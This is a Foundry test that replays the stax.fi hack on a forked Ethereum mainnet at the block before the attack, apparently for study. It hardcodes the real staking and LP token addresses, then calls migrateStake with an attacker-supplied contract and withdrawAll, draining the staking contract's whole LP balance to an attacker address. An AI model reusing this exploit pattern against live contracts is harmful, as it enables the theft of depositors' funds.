// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/interfaces/IERC20.sol";
import {StaxFiExploit} from "../src/StaxFiExploit.sol";

interface IStaxLPStakingContract {
    function withdrawAll(bool claim) external;

    function migrateStake(address oldStaking, uint256 amount) external;
}

/*
 ** This is a simulation on how stax.fi got hacked .
 **  https://tx.eth.samczsun.com/ethereum/0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5
 */

contract StaxFiHack is Test {
    address constant STAX_STAKING_CONTRACT_ADDRESS =
        0xd2869042E12a3506100af1D192b5b04D65137941;
    address constant STAX_LP_TOKEN_ADDRESS =
        0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9;
    IStaxLPStakingContract stakingContract;
    IERC20 lpToken;
    StaxFiExploit staxFiExploit;
    address attacker;

    function setUp() public {
        staxFiExploit = new StaxFiExploit();
        stakingContract = IStaxLPStakingContract(STAX_STAKING_CONTRACT_ADDRESS);
        lpToken = IERC20(STAX_LP_TOKEN_ADDRESS);
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
    }

    function testExploit() public {
        vm.startPrank(attacker);
        uint256 amount = lpToken.balanceOf(STAX_STAKING_CONTRACT_ADDRESS);
        stakingContract.migrateStake(address(staxFiExploit), amount);
        stakingContract.withdrawAll(false);
        assertEq(lpToken.balanceOf(attacker), amount);
    }
}
// We chose block 15725066 which is the block before that hack.
//forge test --match-contract StaxFiHack --fork-url "your_alchemy_mainnet_url" --fork-block-number 15725066
